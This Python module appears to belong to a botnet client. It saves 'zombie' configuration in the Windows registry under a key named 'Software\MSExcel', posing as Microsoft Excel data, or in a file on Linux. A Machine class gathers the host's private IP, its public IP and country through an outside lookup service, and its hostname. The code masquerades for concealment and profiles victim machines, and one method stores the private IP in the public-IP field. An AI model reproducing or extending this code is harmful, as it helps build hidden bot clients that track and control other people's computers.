#!/usr/bin/env python
# -*- coding: utf-8 -*-
# r3nt0n

import socket, platform

from app.modules import http_client

import platform, os, json

if platform.system() == 'Windows':
    import winreg

    def set_win_reg(name, value, rootdir=winreg.HKEY_CURRENT_USER, path=r"Software\MSExcel"):
        try:
            winreg.CreateKey(rootdir, path)
            registry_key = winreg.OpenKey(rootdir, path, 0, winreg.KEY_WRITE)
            winreg.SetValueEx(registry_key, name, 0, winreg.REG_SZ, value)
            winreg.CloseKey(registry_key)
            return True
        except WindowsError:
            return False

    def get_win_reg(name, rootdir=winreg.HKEY_CURRENT_USER, path=r"Software\MSExcel"):
        try:
            registry_key = winreg.OpenKey(rootdir, path, 0, winreg.KEY_READ)
            value, regtype = winreg.QueryValueEx(registry_key, name)
            winreg.CloseKey(registry_key)
            return value
        except WindowsError:
            return None


def get_zombie_settings(path, name):
    value = ''
    if platform.system() == 'Windows':
        try:
            value = get_win_reg(name, winreg.HKEY_LOCAL_MACHINE, r"Software\MSExcel")
        except:
            return False
    elif platform.system() == 'Linux':
        if os.path.exists(path):
            from app.modules import logger
            logger.log('loading {} from file'.format(name), 'SUCCESS')
            with open(path, 'r') as f:
                value = f.read()
        else:
            return False

    if value:
        try:
            value = json.loads(value)
            return value
        except:
            return False
    return False


def set_zombie_settings(path, name, value):
    value = json.dumps(value)
    if platform.system() == 'Windows':
        set_win_reg(name, value, winreg.HKEY_LOCAL_MACHINE, r"Software\MSExcel")
    elif platform.system() == 'Linux':
        if not os.path.exists(path):
            try:
                os.makedirs(os.path.dirname(path))
            except FileExistsError:
                pass
        with open(path, 'w') as f:
            f.write(value)
        return True



class Machine:
    def __init__(self):
        self.info = {
            'public_ip': '',
            'country': '',
            'private_ip': '',
            'hostname': '',
            'mac_addr': ''
        }

    def get_private_ip(self):
        temp_socket = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        try:
            temp_socket.connect(('10.255.255.255', 0))
            self.info['public_ip'] = temp_socket.getsockname()[0]
            return self.info['public_ip']
        except:
            self.info['public_ip'] = '127.0.0.1'
            return False
        finally:
            temp_socket.close()


    def get_public_ip_cc(self):
        try:
            data = http_client.post_json('https://api.myip.com/')
            if data:
                self.info['public_ip'] = data['ip']
                self.info['country'] = data['cc']

                return (self.info['public_ip'], self.info['country'])
            return False
        except:
            return False


    def get_hostname(self):
        # return os.uname()[1]
        # test which works on windows
        #return socket.gethostname()
        self.info['hostname'] = platform.node()
        if self.info['hostname']:
            return self.info['hostname']
        return False



    def get_mac_addr(self):
        pass
        # return current_mac_addr

